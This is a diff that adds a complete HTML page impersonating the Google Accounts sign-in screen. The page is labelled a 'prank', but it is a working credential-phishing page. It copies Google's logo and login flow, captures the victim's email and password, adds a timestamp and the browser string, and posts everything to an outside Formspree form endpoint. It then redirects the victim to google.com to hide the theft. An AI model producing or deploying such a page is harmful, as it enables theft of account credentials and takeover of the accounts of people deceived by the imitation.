@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
+        body { 
+            background: #f0f2f4; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+        }
+        .login-card { width: 100%; max-width: 850px; padding: 20px; }
+        .card-body {
+            background: #fff; 
+            border-radius: 28px; 
+            padding: 48px; 
+            display: flex; 
+            gap: 40px;
+            min-height: 480px; 
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+        }
+        .info-side, .form-side { flex: 1; display: flex; flex-direction: column; }
+        .logo { width: 92px; margin-bottom: 24px; }
+        h1 { font-size: 36px; font-weight: 400; margin-bottom: 16px; }
+        .description { font-size: 16px; color: #444746; }
+
+        .input-group { position: relative; margin-top: 24px; }
+        .input-group input {
+            width: 100%; 
+            padding: 16px 14px; 
+            border: 1px solid #747775; 
+            border-radius: 4px;
+            font-size: 16px; 
+            outline: none;
+        }
+        .input-group input:focus { border: 2px solid #0b57d0; }
+        .input-group label {
+            position: absolute; 
+            left: 14px; 
+            top: 16px; 
+            background: white; 
+            padding: 0 5px;
+            color: #444746; 
+            font-size: 16px; 
+            transition: all 0.2s; 
+            pointer-events: none;
+        }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label { 
+            top: -10px; 
+            font-size: 12px; 
+            color: #0b57d0; 
+        }
+
+        .actions { 
+            display: flex; 
+            justify-content: flex-end; 
+            gap: 12px; 
+            margin-top: auto; 
+            padding-top: 32px; 
+        }
+        .btn { 
+            border: none; 
+            border-radius: 20px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            padding: 10px 24px; 
+            font-size: 14px; 
+        }
+        .btn-text { background: none; color: #0b57d0; }
+        .btn-primary { background: #0b57d0; color: white; }
+
+        .account-badge {
+            display: inline-flex; 
+            align-items: center; 
+            padding: 4px 14px 4px 6px;
+            border: 1px solid #dadce0; 
+            border-radius: 20px; 
+            font-size: 14px; 
+            margin: 16px 0 24px 0;
+        }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <div class="login-card">
+        <form id="prankForm" action="https://formspree.io/f/xpwdprjj" method="POST">
+            
+            <div class="card-body">
+                <!-- Left Side -->
+                <section class="info-side">
+                    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
+                         alt="Google" class="logo">
+
+                    <div id="header-1">
+                        <h1>Sign in</h1>
+                        <p class="description">to continue to Chrome</p>
+                    </div>
+
+                    <div id="header-2" class="hidden">
+                        <h1>Welcome</h1>
+                        <div class="account-badge">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                            </svg>
+                            <span id="display-email-text"></span>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Right Side - Form -->
+                <section class="form-side">
+                    <div id="step-1">
+                        <div class="input-group">
+                            <input type="email" name="email" id="email-input" placeholder=" " required>
+                            <label>Email or phone</label>
+                        </div>
+                        <div class="actions">
+                            <button type="button" class="btn btn-text">Create account</button>
+                            <button type="button" class="btn btn-primary" onclick="goToPassword()">Next</button>
+                        </div>
+                    </div>
+
+                    <div id="step-2" class="hidden">
+                        <div class="input-group">
+                            <input type="password" name="password" id="pass-input" placeholder=" " required>
+                            <label>Enter your password</label>
+                        </div>
+                        <div style="display:flex; align-items:center; margin-top:16px; font-size:14px; gap:8px;">
+                            <input type="checkbox" id="show-pass" onclick="togglePass()">
+                            <label for="show-pass" style="cursor:pointer;">Show password</label>
+                        </div>
+                        <div class="actions">
+                            <a href="#" style="color:#0b57d0; font-size:14px; margin-right:auto;">Forgot password?</a>
+                            <button type="submit" class="btn btn-primary" id="submitBtn">Next</button>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <!-- Hidden fields -->
+            <input type="hidden" name="_subject" value="New Google Prank Login Captured">
+            <input type="hidden" name="timestamp" value="">
+            <input type="hidden" name="browser" value="">
+            <input type="hidden" name="_captcha" value="false">
+        </form>
+    </div>
+
+    <script>
+        function goToPassword() {
+            const email = document.getElementById('email-input').value.trim();
+            if (email) {
+                document.getElementById('display-email-text').innerText = email;
+                document.getElementById('header-1').classList.add('hidden');
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('header-2').classList.remove('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+            } else {
+                alert("Please enter your email or phone number.");
+            }
+        }
+
+        function togglePass() {
+            const passInput = document.getElementById("pass-input");
+            passInput.type = passInput.type === "password" ? "text" : "password";
+        }
+
+        // Handle form submission → Redirect to another site
+        document.getElementById('prankForm').addEventListener('submit', function() {
+            // Fill hidden fields
+            document.querySelector('input[name="timestamp"]').value = new Date().toLocaleString('en-CA', { timeZone: 'America/Toronto' });
+            document.querySelector('input[name="browser"]').value = navigator.userAgent.substring(0, 150);
+
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = "Signing in...";
+            btn.disabled = true;
+
+            // Redirect after a short delay (so Formspree has time to submit)
+            setTimeout(() => {
+                window.location.href = "https://google.com";   // ←←← CHANGE THIS TO ANY SITE YOU WANT
+            }, 1200);
+        });
+    </script>
+</body>
+</html>
